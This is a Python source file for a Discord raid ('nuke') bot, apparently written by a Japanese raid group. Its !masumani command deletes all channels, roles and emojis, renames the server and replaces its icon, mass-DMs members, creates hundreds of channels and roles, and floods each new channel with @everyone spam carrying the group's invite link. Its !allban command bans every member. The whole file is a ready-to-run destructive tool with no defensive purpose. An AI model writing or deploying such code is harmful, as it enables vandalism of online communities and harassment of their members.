import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} logged in')
    print(f'Bot ID: {bot.user.id}')

@bot.command()
async def masumani(ctx):
    new_server_name = 'ますまに共栄圏植民地｜MSMN'
    icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
    channel_name = 'ますまに共栄圏最強'
    channel_count = 200
    spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
    spam_count = 500
    role_name = 'ますまに共栄圏に荒らされましたww'
    role_count = 150

    await ctx.message.delete()
    guild = ctx.guild
    old_server_name = guild.name
    user = ctx.author

    await user.send('処理を開始します')

    # 全処理を並列実行（爆速）

    # DM送信（非同期）
    async def send_dm(member):
        try:
            await member.send(f'{old_server_name}を破壊しました https://discord.gg/DCKWUNfEA5')
            return 1
        except:
            return 0

    dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
    dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
    dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
    await user.send(f'DM送信完了: {dm_count}人')

    icon_bytes = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    await guild.edit(icon=icon_bytes)
                    await user.send('アイコン変更完了')
    except:
        pass

    try:
        await guild.edit(name=new_server_name)
        await user.send(f'サーバー名変更完了')
    except:
        pass

    emoji_deleted = 0
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            emoji_deleted += 1
        except:
            pass
    await user.send(f'絵文字削除: {emoji_deleted}個')

    # 絵文字作成（並列処理）
    emoji_created = 0
    if icon_bytes:
        try:
            max_emojis = guild.emoji_limit
            emoji_tasks = []
            for i in range(max_emojis):
                emoji_tasks.append(guild.create_custom_emoji(name=f'emoji{i}', image=icon_bytes))
                if len(emoji_tasks) >= 10:
                    results = await asyncio.gather(*emoji_tasks, return_exceptions=True)
                    emoji_created += sum(1 for r in results if not isinstance(r, Exception))
                    emoji_tasks = []
                    await asyncio.sleep(0.1)
            if emoji_tasks:
                results = await asyncio.gather(*emoji_tasks, return_exceptions=True)
                emoji_created += sum(1 for r in results if not isinstance(r, Exception))
        except:
            pass
    await user.send(f'絵文字作成: {emoji_created}個')

    role_deleted = 0
    for role in guild.roles:
        if role.name != '@everyone' and not role.managed:
            try:
                await role.delete()
                role_deleted += 1
            except:
                pass
    await user.send(f'ロール削除: {role_deleted}個')

    # ロール作成（並列処理）
    role_created = 0
    role_tasks = []
    for i in range(role_count):
        color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
        role_tasks.append(guild.create_role(name=role_name, color=color))
        if len(role_tasks) >= 10:
            results = await asyncio.gather(*role_tasks, return_exceptions=True)
            role_created += sum(1 for r in results if not isinstance(r, Exception))
            role_tasks = []
    if role_tasks:
        results = await asyncio.gather(*role_tasks, return_exceptions=True)
        role_created += sum(1 for r in results if not isinstance(r, Exception))
    await user.send(f'ロール作成: {role_created}個')

    deleted_count = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted_count += 1
        except:
            pass
    await user.send(f'チャンネル削除: {deleted_count}個')

    # チャンネル作成（並列処理・爆速）
    created_channels = []
    created_count = 0
    tasks = []

    for i in range(channel_count):
        tasks.append(guild.create_text_channel(name=channel_name))
        if len(tasks) >= 10:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if not isinstance(result, Exception):
                    created_count += 1
                    created_channels.append(result)
            tasks = []

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if not isinstance(result, Exception):
                created_count += 1
                created_channels.append(result)

    await user.send(f'チャンネル作成: {created_count}個')

    await user.send('メッセージ送信中...')
    total_messages = 0

    # 全チャンネル同時にメッセージ送信（爆速）
    async def spam_channel(channel):
        count = 0
        for i in range(spam_count):
            try:
                await channel.send(spam_message)
                count += 1
            except:
                pass
        return count

    # 全チャンネルに同時送信
    spam_tasks = [spam_channel(ch) for ch in created_channels]
    results = await asyncio.gather(*spam_tasks, return_exceptions=True)

    for result in results:
        if not isinstance(result, Exception):
            total_messages += result

    await user.send(f'完了 メッセージ送信: {total_messages}件')

@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    user = ctx.author

    await user.send('BAN処理開始')

    members = [m for m in guild.members if not m.bot and m != user]
    total = len(members)

    await user.send(f'対象: {total}人')

    banned = 0
    failed = 0

    for member in members:
        try:
            await guild.ban(member, reason='ますまに共栄圏BAN')
            banned += 1
            if banned % 10 == 0:
                await user.send(f'進捗: {banned}/{total}')
        except:
            failed += 1

    await user.send(f'完了 成功:{banned} 失敗:{failed}')

if __name__ == '__main__':
    TOKEN = os.getenv('TOKEN')
    if not TOKEN:
        print('TOKEN not found')
        exit(1)
    bot.run(TOKEN)